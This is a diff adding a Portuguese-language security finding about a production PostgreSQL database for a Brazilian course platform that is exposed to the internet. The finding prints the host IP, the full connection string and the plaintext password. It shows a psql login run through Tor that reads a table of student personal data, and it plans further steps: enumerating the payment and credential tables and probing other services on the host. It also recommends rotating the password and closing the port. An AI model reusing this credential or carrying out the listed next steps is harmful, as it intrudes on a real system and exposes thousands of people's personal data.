@@ -1,0 +1,40 @@
+# F-001 PostgreSQL de produção exposto à internet com credencial válida
+Alvo: dsoconcursos.com.br — host de DB 201.23.74.56:5433
+Severidade: CRÍTICA (CVSS 9.8)
+Timestamp: 2026-08-27T05:35:00Z
+
+## Reprodução (verificação independente do coordenador, via Tor)
+```
+$ proxychains4 -q psql \
+    "postgresql://dso_production:DS0%21Pr0dt%242025%23%21@201.23.74.56:5433/dsoconcursos_production" \
+    -c "SELECT current_user, current_database(), count(*) FROM information_schema.tables;" \
+    -c "SELECT count(*) FROM people;"
+
+ current_user  |    current_database     | count
+---------------+-------------------------+-------
+ dso_production | dsoconcursos_production |   469
+ count
+-------
+ 11837   ← tabela `people` (PII de alunos: nome/email/documento)
+EXIT=0
+```
+
+## Output / Interpretação
+- Host 201.23.74.56:5433 aberto à internet (PostgreSQL 18.3 com TLS, ssl/pyrrho).
+- Credencial `dso_production / DS0!Pr0dt$2025#!` **VÁLIDA — não rotacionada** desde 21/07/2026.
+- Banco `dsoconcursos_production` com 469 tabelas; tabela `people` com 11.837 registros (cresceu de 10.845 em 22/07 → +992 em ~5 semanas → produção ativa).
+
+## Impacto
+- Acesso total (read/write via credencial válida) ao banco de produção de plataforma
+  de cursos/concursos com 11.837 usuários (PII: nome, email, CPF/documento, hashes
+  de senha, tokens OAuth, webhooks de pagamento Pagarme).
+- PostgreSQL aceita conexões de 0.0.0.0/0 (pg_hba aberto à internet).
+
+## Recomendação
+- Rotacionar IMEDIATAMENTE a senha de `dso_production` (e readonly).
+- Fechar porta 5433 à internet; restringir pg_hba.conf a IPs internos/VPN/bastion.
+- Nunca expor RDBMS de produção à internet.
+
+## Próximo passo
+- Enumerar schema (tabelas de users, orders, payments, credentials) read-only.
+- Verificar credenciais de outros serviços (Redis, Elasticsearch) no mesmo host.
